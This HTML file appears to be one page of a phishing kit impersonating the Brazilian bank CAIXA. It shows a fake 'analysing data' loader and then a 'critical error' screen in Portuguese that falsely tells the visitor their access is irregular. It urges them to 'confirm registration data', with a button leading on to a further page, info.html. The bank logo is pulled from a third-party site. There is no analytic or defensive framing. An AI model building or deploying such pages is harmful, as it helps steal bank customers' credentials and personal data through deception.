<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Erro - CAIXA</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            background-color: #f0f0f0;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            background-color: #ffffff;
            padding: 24px;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* --- TELA DE CARREGAMENTO --- */
        #tela-carregamento {
            display: flex;
            flex: 1;
            align-items: center;
            justify-content: center;
        }

        .text-wrapper {
            color: #005ca9;
            font-size: 22px;
            font-weight: 600;
            display: flex;
            align-items: center;
        }

        .dots {
            display: inline-block;
            width: 25px; 
            text-align: left;
        }

        /* --- TELA DE ERRO --- */
        #tela-erro {
            display: none; /* Começa escondida */
            flex-direction: column;
            flex: 1;
        }

        .header {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            margin-bottom: 40px;
        }

        .logo img {
            height: 40px;
            width: auto;
        }

        h1 {
            color: #c90000; /* Vermelho para indicar erro */
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 12px;
            text-align: center;
        }

        p.subtitle {
            color: #5b6571;
            font-size: 16px;
            margin-bottom: 40px;
            text-align: center;
            line-height: 1.5;
        }

        /* Botão Confirmar */
        .btn-confirmar {
            background-color: #F39200; /* Laranja da Caixa */
            color: #ffffff;
            border: none;
            padding: 14px 24px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s ease;
        }

        .btn-confirmar:hover {
            background-color: #d88200;
        }
    </style>
</head>
<body>

    <div class="mobile-container">
        
        <!-- TELA 1: Analisando -->
        <div id="tela-carregamento">
            <div class="text-wrapper">
                Analisando dados<span class="dots" id="pontinhos"></span>
            </div>
        </div>

        <!-- TELA 2: Erro Crítico (Fica oculta inicialmente) -->
        <div id="tela-erro">
            <header class="header">
                <div class="logo">
                    <img src="https://logo-teka.com/wp-content/uploads/2026/07/caixa-icon-logo.svg" alt="SVG logo CAIXA" />
                </div>
            </header>

            <main>
                <h1>Erro Crítico</h1>
                <p class="subtitle">Identificamos uma irregularidade no seu acesso. Por motivos de segurança, será necessário <strong>confirmar alguns dos seus dados</strong> cadastrais para liberar sua conta novamente.</p>

                <!-- Botão atualizado para redirecionar para info.html -->
                <button type="button" class="btn-confirmar" onclick="window.location.href='info.html'">Confirmar informações</button>
            </main>
        </div>

    </div>

    <script>
        // Animação dos pontinhos
        const pontinhos = document.getElementById('pontinhos');
        let contador = 0;

        const intervaloPontos = setInterval(() => {
            contador++;
            if (contador > 3) contador = 0;
            pontinhos.textContent = '.'.repeat(contador);
        }, 500);

        // Lógica de transição de tela após 3 segundos
        setTimeout(() => {
            // 1. Para a animação dos pontos
            clearInterval(intervaloPontos);
            
            // 2. Esconde a tela de carregamento
            document.getElementById('tela-carregamento').style.display = 'none';
            
            // 3. Mostra a tela de erro
            document.getElementById('tela-erro').style.display = 'flex';
        }, 3000);
    </script>
</body>
</html>
